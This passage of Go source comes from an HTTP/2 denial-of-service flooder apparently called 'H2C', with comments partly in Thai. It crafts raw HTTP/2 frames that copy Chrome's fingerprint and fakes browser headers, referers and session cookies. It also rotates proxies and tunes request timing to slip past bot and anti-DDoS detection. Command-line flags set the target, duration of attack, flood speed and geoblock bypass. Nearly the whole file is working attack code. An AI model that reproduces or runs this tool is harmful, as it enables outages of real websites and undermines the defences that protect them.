		if !browserProfile.isFirefox && !browserProfile.isSafari {
			// Chrome/Edge always send these in specific order
			h2_headers = append(h2_headers, [2]string{"sec-fetch-site", secFetchSite})
			h2_headers = append(h2_headers, [2]string{"sec-fetch-mode", secFetchMode})
			h2_headers = append(h2_headers, [2]string{"sec-fetch-user", secFetchUser})
			h2_headers = append(h2_headers, [2]string{"sec-fetch-dest", secFetchDest})
		}
		
		// 4. Accept-Encoding (after sec-fetch-* for Chrome)
		// CRITICAL: Ensure accept-encoding is never empty or suspicious
		acceptEncoding := browserProfile.acceptEncoding
		if acceptEncoding == "" {
			acceptEncoding = "gzip, deflate, br"
		}
		h2_headers = append(h2_headers, [2]string{"accept-encoding", acceptEncoding})
		
		// 5. Accept-Language
		// CRITICAL: Ensure accept-language is never empty
		if acceptLang == "" {
			acceptLang = "en-US,en;q=0.9"
		}
		h2_headers = append(h2_headers, [2]string{"accept-language", acceptLang})
		
		// 6. Additional headers based on request type and browser behavior
		
		// Cache-Control (rare, only for reload)
		if secFetchMode == "navigate" && rand.Float32() < 0.05 {
			h2_headers = append(h2_headers, [2]string{"cache-control", "max-age=0"})
		}
		
		// Referer header (most requests have it except initial navigation)
		if secFetchSite != "none" && rand.Float32() < 0.85 {
			var refererValue string
			if secFetchSite == "same-origin" {
				// Same origin referer
				refererValue = fmt.Sprintf("%s://%s/", scheme, authority)
			} else if secFetchSite == "same-site" {
				// Same site (could be subdomain)
				refererValue = fmt.Sprintf("%s://%s/", scheme, authority)
			} else if secFetchSite == "cross-site" && secFetchMode == "navigate" {
				// Navigation from search engine
				searchEngines := []string{
					"https://www.google.com/",
					"https://www.bing.com/",
					"https://duckduckgo.com/",
				}
				refererValue = searchEngines[rand.Intn(len(searchEngines))]
			}
			
			// Only add referer if we have a valid value
			if refererValue != "" && !strings.ContainsAny(refererValue, "<>\"';&#") {
				h2_headers = append(h2_headers, [2]string{"referer", refererValue})
			}
		}
		
		// DNT header (less common now, only ~15% of users)
		if rand.Float32() < 0.15 {
			h2_headers = append(h2_headers, [2]string{"dnt", "1"})
		}
		
		// Anti-Signature #37: Standard cookie management (use only legitimate cookies)
		var cookieHeader string
		if cookie != "" {
			cookieHeader = cookie
		}
		
		// Generate standard session cookies gradually like real browsers
		if proxyInfo != nil {
			// Initial session cookies (standard web application cookies)
			if len(proxyInfo.SessionCookies) == 0 && proxyInfo.RequestCount > 2 {
				// Use standard session cookie names only
				standardCookieNames := []string{"JSESSIONID", "PHPSESSID", "ASP.NET_SessionId"}
				cookieName := standardCookieNames[rand.Intn(len(standardCookieNames))]
				proxyInfo.SessionCookies[cookieName] = GenerateRealisticCookieValue(cookieName)
				
				// Add standard CSRF token
				if rand.Float32() < 0.7 {
					proxyInfo.SessionCookies["_token"] = GenerateRealisticCookieValue("_csrf")
				}
			} else if proxyInfo.RequestCount > 10 && rand.Float32() < 0.3 {
				// Add standard analytics cookies (legitimate)
				if _, exists := proxyInfo.SessionCookies["_ga"]; !exists {
					proxyInfo.SessionCookies["_ga"] = GenerateRealisticCookieValue("_ga")
				}
			}
			
			// Build cookie header with standard format
			var sessionCookies []string
			for name, value := range proxyInfo.SessionCookies {
				// CRITICAL: Ensure cookie names and values don't contain suspicious characters
				if !strings.ContainsAny(name, "<>\"';&=") && !strings.ContainsAny(value, "<>\"';&") && len(value) > 0 && len(name) > 0 {
					sessionCookies = append(sessionCookies, fmt.Sprintf("%s=%s", name, value))
				}
			}
			
			if len(sessionCookies) > 0 {
				if cookieHeader != "" {
					cookieHeader += "; "
				}
				cookieHeader += strings.Join(sessionCookies, "; ")
			}
		}
		
		if cookieHeader != "" {
			h2_headers = append(h2_headers, [2]string{"cookie", cookieHeader})
		}
		
		// Cookie header should be added last (after all other headers)
		// This is moved to after DNT header for proper ordering
		
		// จำลองการ retry ของเบราว์เซอร์จริง (เพื่อหลีกเลี่ยง Pattern #4)
		var conn net.Conn
		var wConn tls.UConn
		retryCount := 0
		maxRetries := 3
		
		for retryCount < maxRetries {
			// Initialize raw TCP connection
			var err error
			conn, err = initConnection(proxyInfo, hostname, port)
				if err != nil {
				retryCount++
				atomic.AddInt64(&errorCount, 1)
				
				// Fast retry delays (optimized for speed)
				retryDelay := time.Duration(RandomInt(100, 500)*retryCount) * time.Millisecond
			if debugmode > 1 {
					fmt.Printf("[H2C] | Connection failed, retry %d/%d after %v\n", retryCount, maxRetries, retryDelay)
			}
				time.Sleep(retryDelay)
					continue
				}

						// Establish TLS connection with custom fingerprinting
			wConn, err = establishTls(hostname, &conn, proxyInfo)
			if err != nil {
				retryCount++
				atomic.AddInt64(&errorCount, 1)
				conn.Close()
				
				// Fast TLS handshake retry delays
				retryDelay := time.Duration(RandomInt(50, 300)*retryCount) * time.Millisecond
						if debugmode > 1 {
					fmt.Printf("[H2C] | TLS handshake failed, retry %d/%d after %v\n", retryCount, maxRetries, retryDelay)
				}
				time.Sleep(retryDelay)
				continue
			}
			
			// สำเร็จ - ออกจาก retry loop
			break
		}
		
		// หาก retry หมดแล้วยังไม่สำเร็จ
		if retryCount >= maxRetries {
			// Fast backoff for high-speed operation
			backoffDelay := time.Duration(RandomInt(100, 500)) * time.Millisecond
			
			// Optimized backoff based on proxy profile
			if proxyInfo != nil {
				switch proxyInfo.TimingProfile {
				case 0: // Conservative - slightly longer but still fast
					backoffDelay = backoffDelay * 2
				case 1: // Moderate - use base delay
					// Use default
				case 2: // Aggressive - faster
					backoffDelay = backoffDelay / 2
				case 3: // Very aggressive - minimal delay
					backoffDelay = backoffDelay / 3
				}
			}
			time.Sleep(backoffDelay)
			continue
		}
		
		// Check negotiated protocol
		proto := wConn.ConnectionState().NegotiatedProtocol
		switch proto {
		case "http/1.1":
			// HTTP/1.1 disabled for this advanced version
			wConn.Close()
			continue
		default:
			// HTTP/2 Connection - send preface
			if _, err := wConn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")); err != nil {
				wConn.Close()
				atomic.AddInt64(&errorCount, 1)
				continue
			}
			
			// Send Chrome 120 compatible SETTINGS frame (เพื่อหลีกเลี่ยง Pattern #4)
			// Chrome 120 SETTINGS: HEADER_TABLE_SIZE=65536, ENABLE_PUSH=0, MAX_CONCURRENT_STREAMS=1000, 
			// INITIAL_WINDOW_SIZE=6291456, MAX_FRAME_SIZE=16777215, MAX_HEADER_LIST_SIZE=262144
			chromeSettings := []byte{
				0x00, 0x00, 0x24, // Length: 36 bytes (6 settings * 6 bytes each)
				0x04,             // Type: SETTINGS
				0x00,             // Flags: 0
				0x00, 0x00, 0x00, 0x00, // Stream ID: 0
				
				// SETTINGS_HEADER_TABLE_SIZE (0x1) = 65536
				0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
				
				// SETTINGS_ENABLE_PUSH (0x2) = 0
				0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
				
				// SETTINGS_MAX_CONCURRENT_STREAMS (0x3) = 1000
				0x00, 0x03, 0x00, 0x00, 0x03, 0xe8,
				
				// SETTINGS_INITIAL_WINDOW_SIZE (0x4) = 6291456
				0x00, 0x04, 0x00, 0x60, 0x00, 0x00,
				
				// SETTINGS_MAX_FRAME_SIZE (0x5) = 16777215
				0x00, 0x05, 0x00, 0xff, 0xff, 0xff,
				
				// SETTINGS_MAX_HEADER_LIST_SIZE (0x6) = 262144  
				0x00, 0x06, 0x00, 0x04, 0x00, 0x00,
			}
			if _, err := wConn.Write(chromeSettings); err != nil {
				wConn.Close()
				atomic.AddInt64(&errorCount, 1)
				continue
			}
			
			// Read server SETTINGS
			srvSettings := make([]byte, 1024)
			wConn.SetReadDeadline(time.Now().Add(5 * time.Second))
			n, err := wConn.Read(srvSettings)
			if err != nil || n < 9 || srvSettings[3] != 0x04 {
				wConn.Close()
				atomic.AddInt64(&errorCount, 1)
				continue
			}
			
						// Send SETTINGS ACK
			if _, err := wConn.Write([]byte{0x00, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00}); err != nil {
				wConn.Close()
				atomic.AddInt64(&errorCount, 1)
			continue
		}
			
			// Send WINDOW_UPDATE frame ให้เหมือนเบราว์เซอร์จริง (anti-pattern #3)
			// เบราว์เซอร์จริงมักส่ง WINDOW_UPDATE หลังจาก SETTINGS
			windowIncrement := uint32(65536) // Typical browser window increment
			windowUpdateFrame := []byte{
				0x00, 0x00, 0x04, // Length: 4 bytes
				0x08,             // Type: WINDOW_UPDATE
				0x00,             // Flags: 0
				0x00, 0x00, 0x00, 0x00, // Stream ID: 0 (connection-level)
			}
			incrementBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(incrementBytes, windowIncrement)
			windowUpdateFrame = append(windowUpdateFrame, incrementBytes...)
			
			if _, err := wConn.Write(windowUpdateFrame); err != nil {
				wConn.Close()
				atomic.AddInt64(&errorCount, 1)
				continue
			}
			
			// Initialize framer for HTTP/2 requests
			var fr Framer
			fr.init()
			var buf bytes.Buffer
			
			// Calculate request rate with session warming and proxy-specific variations (เพื่อหลีกเลี่ยง Pattern #4 & Signature #69)
	rate := rps
	if randrate {
		rate = RandomInt(1, 90)
	}

			// ใช้ proxy-specific RateFactor เพื่อหลีกเลี่ยง uniform request patterns (anti-signature #69)
			if proxyInfo != nil && proxyInfo.RateFactor > 0 {
				rate = int(float64(rate) * proxyInfo.RateFactor)
				if rate < 1 { 
					rate = 1 
				}
			}

					// Fast session warming: rapid acceleration for maximum speed
		if sessionAge < maxSessionAge {
			warmupFactor := float64(sessionAge) / float64(maxSessionAge)
			rate = int(float64(rate) * (0.8 + 0.2*warmupFactor)) // Start at 80%, reach 100% quickly
			if rate < 1 {
				rate = 1
			}
		}
		
		// Advanced organic traffic control system (anti-signature #69)
		
		// Optimized rate adjustment for daily patterns (less restrictive)
		activityMultiplier := currentPattern.activityMultiplier
		if activityMultiplier < 0.7 { // Boost low activity periods
			activityMultiplier = 0.7 // Minimum 70% speed
		}
		rate = int(float64(rate) * activityMultiplier)
		if rate < 1 {
			rate = 1
		}
		
		// Session evolution with more realistic patterns
		if proxyInfo != nil {
			sessionDuration := time.Since(proxyInfo.SessionStartTime).Minutes()
			
			// Optimized error rate handling (less impact on speed)
			errorRate := float64(sessionErrors) / float64(sessionRequests + 1)
			if errorRate > 0.2 { // Only slow down if error rate > 20%
				rate = int(float64(rate) * 0.85) // Slow down only 15%
			}
			
			// High-speed activity burst patterns
			if sessionDuration > 2 && sessionDuration < 15 {
				// Fast learning phase - quick acceleration
				rate = int(float64(rate) * (0.85 + sessionDuration/50))
			} else if sessionDuration > 15 && sessionDuration < 45 {
				// Peak usage phase - maximum activity
				rate = int(float64(rate) * 1.5)
				// Enhanced micro-bursts
				if rand.Float32() < 0.25 {
					rate = rate * 3
				}
			} else if sessionDuration > 45 && sessionDuration < 90 {
				// Optimized declining phase - still fast
				rate = int(float64(rate) * 0.9)
				// More frequent re-engagement bursts
				if rand.Float32() < 0.2 {
					rate = rate * 4
				}
			} else if sessionDuration > 90 {
				// High-speed idle browsing (less sporadic)
				rate = int(float64(rate) * 0.7)
				// More frequent sudden activity
				if rand.Float32() < 0.15 {
					rate = rate * 6
				}
				// Reduced pause frequency and duration for speed
				if rand.Float32() < 0.15 {
					pauseDuration := time.Duration(RandomInt(500, 3000)) * time.Millisecond
					time.Sleep(pauseDuration)
				}
			}
		}
		
		// Optimized daily pattern pause probability (much less restrictive)
		if rand.Float32() < (currentPattern.pauseProbability * 0.1) {
			// Shorter pause durations based on time of day
			var pauseRange []int
			if currentHour >= 0 && currentHour <= 6 {
				pauseRange = []int{100, 1000} // Night: 0.1-1 seconds
			} else if currentHour >= 7 && currentHour <= 17 {
				pauseRange = []int{50, 300}   // Work hours: 0.05-0.3 seconds
			} else {
				pauseRange = []int{50, 500}   // Evening: 0.05-0.5 seconds
			}
			pauseDuration := time.Duration(RandomInt(pauseRange[0], pauseRange[1])) * time.Millisecond
			time.Sleep(pauseDuration)
		}

			// Send requests with human-like patterns (เพื่อหลีกเลี่ยง Pattern #4)
			successfulRequests := 0
			
			// จำลองพฤติกรรมการโหลดหน้าเว็บของมนุษย์จริง
			for i := 1; i <= rate; i++ {
				bts, err := fr.request(h2_headers)
						if err != nil {
						if debugmode > 1 {
						log.Println("Framer error:", err)
					}
					break
				}
				
				// Buffer requests แต่ไม่เยอะเกินไป (เลียนแบบเบราว์เซอร์จริง)
				if len(buf.Bytes())+len(bts) > 1200 || i%3 == 0 { // ส่งเป็นชุดๆ เหมือนเบราว์เซอร์จริง
					if _, err := wConn.Write(buf.Bytes()); err != nil {
						wConn.Close()
						break
					}
					buf.Reset()
					successfulRequests += i - 1
					
									// Ultra-fast pause between request bursts
				if i < rate {
					if floodOption {
						// Lightning-fast burst timing
						if rand.Float32() < 0.1 {
							time.Sleep(time.Microsecond * time.Duration(RandomInt(1, 10)))
						}
					} else {
						// Ultra-fast non-flood burst timing
						time.Sleep(time.Microsecond * time.Duration(RandomInt(10, 100)))
					}
				}
				}
				buf.Write(bts)
				
				// Anti-Signature #69: Natural request timing with organic variations
				if floodOption {
					// Maximum-speed flood mode with minimal delays
					if rand.Float32() < 0.005 { // 0.5% chance of "thinking" pause
						time.Sleep(time.Microsecond * time.Duration(RandomInt(50, 200)))
					} else if rand.Float32() < 0.002 { // 0.2% chance of "reading" pause
						time.Sleep(time.Microsecond * time.Duration(RandomInt(100, 500)))
					} else {
						// Lightning-fast flood timing
						baseFloodDelay := RandomInt(1, 5)
						time.Sleep(time.Microsecond * time.Duration(baseFloodDelay))
					}
				} else {
										// Ultra-fast organic timing patterns (maximum speed)
					var baseDelay int
					if proxyInfo != nil {
						switch proxyInfo.TimingProfile {
						case 0: // Conservative user (ultra-optimized)
							baseDelay = RandomInt(10, 50)
						case 1: // Moderate user (lightning speed)
							baseDelay = RandomInt(5, 30)
						case 2: // Aggressive user (blazing speed)
							baseDelay = RandomInt(1, 15)
						case 3: // Very aggressive user (maximum speed)
							baseDelay = RandomInt(1, 10)
						default:
							baseDelay = RandomInt(2, 25)
						}
					} else {
						baseDelay = RandomInt(5, 50)
					}
					
					// Ultra-optimized contextual timing
					currentHour := time.Now().Hour()
					if currentHour >= 23 || currentHour <= 5 { // Late night - minimal slowdown
						baseDelay = int(float64(baseDelay) * 1.05)
					} else { // All other hours - maximum speed
						baseDelay = int(float64(baseDelay) * 0.5)
					}
					
					// Ultra-minimal "distraction" pauses
					if rand.Float32() < 0.003 { // 0.3% chance of distraction
						baseDelay += RandomInt(5, 30)
					} else if rand.Float32() < 0.01 { // 1% chance of brief pause
						baseDelay += RandomInt(1, 10)
					}
					
					time.Sleep(time.Millisecond * time.Duration(baseDelay))
				}
			}
			
			// Send remaining buffered requests
			if len(buf.Bytes()) > 0 {
				if _, err := wConn.Write(buf.Bytes()); err != nil {
					wConn.Close()
					atomic.AddInt64(&errorCount, 1)
				} else {
					successfulRequests = rate
				}
			}
			
						// Update statistics with session tracking (anti-signature #69)
			if successfulRequests > 0 {
				atomic.AddInt64(&successCount, int64(successfulRequests))
				atomic.AddInt64(&totalRequests, int64(successfulRequests))
				atomic.AddInt32(&requests, int32(successfulRequests))
				atomic.AddInt32(&responses, int32(successfulRequests))
				
				// Update session counters
				sessionRequests += int64(successfulRequests)
				
				// Update proxy-specific session stats (anti-signature #69)
				if proxyInfo != nil {
					proxyInfo.RequestCount += int64(successfulRequests)
				}
				
				// Update status codes (assume success for now)
		mu.Lock()
				statuses["200"] += successfulRequests
		mu.Unlock()
			} else {
				// Track session errors for behavior adjustment
				sessionErrors++
				if proxyInfo != nil {
					proxyInfo.ErrorCount++
				}
			}
			
			// จำลองพฤติกรรม connection management ที่หลากหลายตาม proxy profile (anti-signature #69)
			
			// เลียนแบบการใช้ connection ตาม VolumeProfile ของ proxy
			var connectionLifetime time.Duration
			if proxyInfo != nil {
				switch proxyInfo.VolumeProfile {
														case 0: // Low volume user - optimized connection time
						connectionLifetime = time.Duration(RandomInt(3000, 8000)) * time.Millisecond
					case 1: // Medium volume user - faster connection cycles
						connectionLifetime = time.Duration(RandomInt(2000, 5000)) * time.Millisecond
					case 2: // High volume user - fast connection time
						connectionLifetime = time.Duration(RandomInt(1000, 3000)) * time.Millisecond
					case 3: // Very high volume user - very fast connections
						connectionLifetime = time.Duration(RandomInt(500, 2000)) * time.Millisecond
					default:
						connectionLifetime = time.Duration(RandomInt(1000, 3000)) * time.Millisecond
				}
			} else {
				connectionLifetime = time.Duration(RandomInt(1000, 3000)) * time.Millisecond
			}
			
			if floodOption {
				// Ultra-fast flood mode connections
				connectionLifetime = connectionLifetime / 5
				if connectionLifetime < 100*time.Millisecond {
					connectionLifetime = 100 * time.Millisecond
				}
			}
			
			go func() {
				// Human-like connection reuse patterns
				select {
				case <-time.After(connectionLifetime):
					// ปิด connection หลังใช้งานนานพอ (เลียนแบบ keep-alive timeout)
					wConn.Close()
				}
			}()
			
			// Anti-Signature #69: Organic browsing behavior with natural pause patterns
			var pauseChance float32 = 0.35 // Slightly less frequent pauses
			var basePause time.Duration
			
			// Context-aware pause behavior
			currentTime := time.Now()
			currentHour := currentTime.Hour()
			currentMinute := currentTime.Minute()
			
			// Adjust pause probability based on time of day
			if currentHour >= 22 || currentHour <= 6 {
				// Night time - increase pause chance (people are sleepy)
				pauseChance = pauseChance * 1.5
			} else if currentHour >= 12 && currentHour <= 14 {
				// Lunch time - decrease pause chance (people are active)
				pauseChance = pauseChance * 0.7
			}
			
			// Adjust based on minute for micro-patterns
			if currentMinute < 5 || currentMinute >= 55 {
				// Beginning/end of hour - slight increase in pause (people checking time)
				pauseChance = pauseChance * 1.1
			}
			
			// ปรับพฤติกรรม pause ตาม TimingProfile และ VolumeProfile
			if proxyInfo != nil {
				// TimingProfile ส่งผลต่อ pause frequency
				switch proxyInfo.TimingProfile {
				case 0: // Conservative - หยุดพักบ่อยกว่า
					pauseChance = 0.6
				case 1: // Moderate - pause ปานกลาง  
					pauseChance = 0.4
				case 2: // Aggressive - pause น้อยกว่า
					pauseChance = 0.2
				}
				
				// VolumeProfile ส่งผลต่อระยะเวลา pause
				switch proxyInfo.VolumeProfile {
														case 0: // Low volume - optimized pauses
						basePause = time.Duration(RandomInt(100, 500)) * time.Millisecond
					case 1: // Medium volume - faster pauses
						basePause = time.Duration(RandomInt(50, 300)) * time.Millisecond
					case 2: // High volume - fast pauses
						basePause = time.Duration(RandomInt(20, 200)) * time.Millisecond  
					case 3: // Very high volume - minimal pauses
						basePause = time.Duration(RandomInt(10, 100)) * time.Millisecond
					default:
						basePause = time.Duration(RandomInt(30, 200)) * time.Millisecond
				}
			} else {
				basePause = time.Duration(RandomInt(30, 200)) * time.Millisecond
			}
			
			// Reduced pause probability for maximum speed
			if rand.Float32() < (pauseChance * 0.2) {
				if floodOption {
					// Ultra-fast flood mode with minimal pauses
					basePause = basePause / 20
					if basePause < 1*time.Millisecond {
						basePause = 1 * time.Millisecond
					}
				}
				time.Sleep(basePause)
			} else {
				// Ultra-fast active browsing
				activePause := time.Duration(RandomInt(1, 20)) * time.Millisecond
				time.Sleep(activePause)
			}
		}
	}
}



func LoadProxies() {
	parsedProxies, err := parseProxiesAdvanced(proxyFile)
	if err != nil {
		fmt.Printf("[H2C] | Error loading proxies: %v\n", err)
		return
	}

	proxies = parsedProxies
	
	// Shuffle proxies for better distribution
	rand.Seed(time.Now().UnixNano())
	rand.Shuffle(len(proxies), func(i, j int) {
		proxies[i], proxies[j] = proxies[j], proxies[i]
	})
	
	fmt.Printf("[H2C] | Loaded %d proxies\n", len(proxies))
}

func CPU() (float64, error) {
	percentages, err := cpu.Percent(0, true)
	if err != nil {
		return 0, err
	}
	return percentages[0], nil
}

func MEM() (float64, error) {
	vmStat, err := mem.VirtualMemory()
	if err != nil {
		return 0, err
	}
	return vmStat.UsedPercent, nil
}

func Summary() {
	elapsed := 0
	var totalRequests int32
	var totalConnections int32
	if proxyIP != "" {
		totalConnections = int32(conns)
	} else {
		totalConnections = int32(len(proxies) * conns)
	}
	for {
		mu.Lock()
		var statusString string
		var bypassedRequests float64
		var totalResponses float64

		totalRequests = requests + responses
		for code, count := range statuses {
			if statusString != "" {
				statusString += ", "
			}

			codeInt, err := strconv.Atoi(code)
			if err != nil && code == "PROXYERR" {
				statusString += fmt.Sprintf("\u001b[31m%s\u001b[0m: \u001b[4m%d\u001b[0m", code, count)
				continue
			}

			totalResponses += float64(count)

			if codeInt < 500 && codeInt >= 400 && codeInt != 404 {
				statusString += fmt.Sprintf("\u001b[31m%d\u001b[0m: \u001b[4m%d\u001b[0m", codeInt, count)
				continue
			} else if codeInt >= 300 && codeInt < 400 {
				statusString += fmt.Sprintf("\u001b[33m%d\u001b[0m: \u001b[4m%d\u001b[0m", codeInt, count)
				bypassedRequests += float64(count)
				continue
			} else if codeInt < 9 {
				continue
			} else {
				statusString += fmt.Sprintf("\u001b[32m%d\u001b[0m: \u001b[4m%d\u001b[0m", codeInt, count)
				bypassedRequests += float64(count)
			}
		}

		var averageRPS, bypassRate float64
		if elapsed > 0 {
			averageRPS = float64(totalRequests) / float64(elapsed)
		}

		if totalResponses > 0 {
			bypassRate = (bypassedRequests / totalResponses) * 100
		}

		if connections < 0 && proxyIP == "" {
			connections = int32(len(proxies))
		} else if connections < 0 && proxyIP != "" {
			connections = int32(conns)
		}

		if connections < 0 && limit > 0 {
			connections = int32(limit)
		}

		numGoroutines := runtime.NumGoroutine()

		cpuUsage, err := CPU()
		if err != nil {
			cpuUsage = 0
		}

		memUsage, err := MEM()
		if err != nil {
			memUsage = 0
		}

		fmt.Print("\u001b[H\u001b[2J")
		fmt.Printf("\n ————— \u001b[1mSummary (H2C)\u001b[0m ———–—\n")
		fmt.Printf("  GO Routines: \u001b[1m%d\u001b[0m\n", numGoroutines)
		fmt.Printf("  Connections: \u001b[1m%d/%d\u001b[0m\n", connections, totalConnections)
		fmt.Printf("  Status Codes: [%s]\n", statusString)
		fmt.Printf("  Sent: [\u001b[1m%d\u001b[0m], Received: [\u001b[1m%d\u001b[0m]\n", requests, responses)
		fmt.Printf("  Bypass rate: \u001b[1m%.2f\u001b[0m%%\n", bypassRate)
		fmt.Printf("  Average rq/s: \u001b[1m%.2f\u001b[0m\n", averageRPS)
		fmt.Printf("  CPU: [\u001b[1m%.2f%%\u001b[0m], MEM: [\u001b[1m%.2f%%\u001b[0m]\n", cpuUsage, memUsage)
		fmt.Printf("  Duration: \u001b[1m%d\u001b[0m seconds", duration-elapsed)
		fmt.Printf("\n —————————————————————————\n")
		mu.Unlock()
		time.Sleep(1 * time.Second)
		elapsed += 1
	}
}



func Verify(wg *sync.WaitGroup) {
	defer wg.Done()
	var final_proxies []*ProxyInfo
	var mu_proxy sync.Mutex

	var inner_wg sync.WaitGroup

	for index, proxy := range proxies {
		inner_wg.Add(1)
		go func(index int, proxy *ProxyInfo) {
			defer inner_wg.Done()
			fmt.Printf("[H2C] | [%d/%d] Checking proxy: %s\n", index, len(proxies), proxy.Addr)
			
			// Simple TCP connectivity test for raw approach
			conn, err := net.DialTimeout("tcp", proxy.Addr, 10*time.Second)
			if err != nil {
				fmt.Printf("[H2C] | (%s) Invalid proxy: %s\n", proxy.Addr, err.Error())
				return
			}
			conn.Close()
			
			fmt.Printf("[H2C] | (%s) Working Proxy\n", proxy.Addr)
				mu_proxy.Lock()
				final_proxies = append(final_proxies, proxy)
				mu_proxy.Unlock()
		}(index, proxy)
	}
	inner_wg.Wait()
	
	if len(final_proxies) >= 1 {
		proxies = final_proxies
		fmt.Printf("[H2C] | Verified %d working proxies\n", len(proxies))
	}
}



func main() {

	flag.StringVar(&target, "url", "", "Target URL")
	flag.IntVar(&rps, "rate", 10, "Requests per second")
	flag.IntVar(&conns, "threads", 1, "Connections per proxy")
	flag.IntVar(&duration, "time", 5, "Duration of attack")
	flag.StringVar(&proxyFile, "proxy", "", "Proxy file path")
	flag.StringVar(&cookie, "cookie", "", "Use custom Cookie header")
	flag.StringVar(&useragent, "ua", "", "Use custom User-Agent header")
	flag.StringVar(&proxyIP, "ip", "", "Use proxy IP address (flooder)")

	flag.BoolVar(&proxyAuth, "auth", false, "Use proxy authentication")
	flag.IntVar(&debugmode, "debug", 0, "Debug mode (0=off), (1=basic), (2=advanced)")
	flag.BoolVar(&randpath, "randpath", false, "Randomise url request path")
	flag.BoolVar(&randrate, "randrate", false, "Randomise rate of requests")
	flag.BoolVar(&ratelimitOption, "ratelimit", false, "use ratelimit handler")
	flag.BoolVar(&floodOption, "flood", false, "Increase request speed")
	flag.BoolVar(&useHpack, "hpack", false, "Use raw HTTP/2 hpack encoding")
	flag.BoolVar(&closeOption, "close", false, "Close bad/blocked requests")
	flag.IntVar(&limit, "limit", 0, "Limit number of proxy connections")
	flag.BoolVar(&verifyProxies, "verify", false, "Use built-in proxy checker")
	flag.BoolVar(&rotateUserAgent, "rotate-ua", false, "Rotate User-Agent for each request (disable session consistency)")
	flag.StringVar(&originRaw, "origin", "", "Bypass geoblock (US,CN,NL)")
	flag.IntVar(&cpuLimit, "cpu", 0, "Limit number of cpu's")
	flag.Parse()

	// fmt.Printf("proxyAuth: [%v]\n", proxyAuth)

	if target == "" || proxyFile == "" {
		flag.Usage()
		os.Exit(1)
	}

	parsed, err := url.Parse(target)
	if err != nil {
		fmt.Printf("[H2C] | Error parsing target URL: %v\n", err)
		return
	}

	if cpuLimit > 0 {
		if cpuLimit > runtime.NumCPU() {
			runtime.GOMAXPROCS(runtime.NumCPU())
		} else {
			runtime.GOMAXPROCS(cpuLimit)
		}
	}

	LoadProxies()

	if verifyProxies {
	var wg sync.WaitGroup
		wg.Add(1)
		Verify(&wg)
		wg.Wait()
	}

	if debugmode == 1 {
		go Summary()
	}

	// Start attack with raw TLS approach
	if proxyIP != "" {
		// Single proxy mode
		singleProxy := &ProxyInfo{
			Addr:      proxyIP,
			Auth:      "",
			SessionID: fmt.Sprintf("%s:%s", genRandStr(5), genRandStr(8)),
			ProfileIndex: rand.Intn(10), // 0-9 to match 10 browser profiles
			LangIndex: rand.Intn(13), // 0-12 to match 13 accept-language options
			SessionStartTime: time.Now(),
		}
		for i := 0; i < conns; i++ {
			go startRawTLS(parsed, singleProxy)
		}
	} else {
		// Multiple proxy mode with advanced distribution
		for i := 0; i < conns; i++ {
			x := 0
			for _, proxy := range proxies {
				if x >= limit && limit != 0 {
					break
				}
				go startRawTLS(parsed, proxy)
				x++
			}
		}
	}

	time.Sleep(time.Duration(duration) * time.Second)
	fmt.Printf("\nAttack has ended after %d seconds!\n", duration)
	os.Exit(0)
}
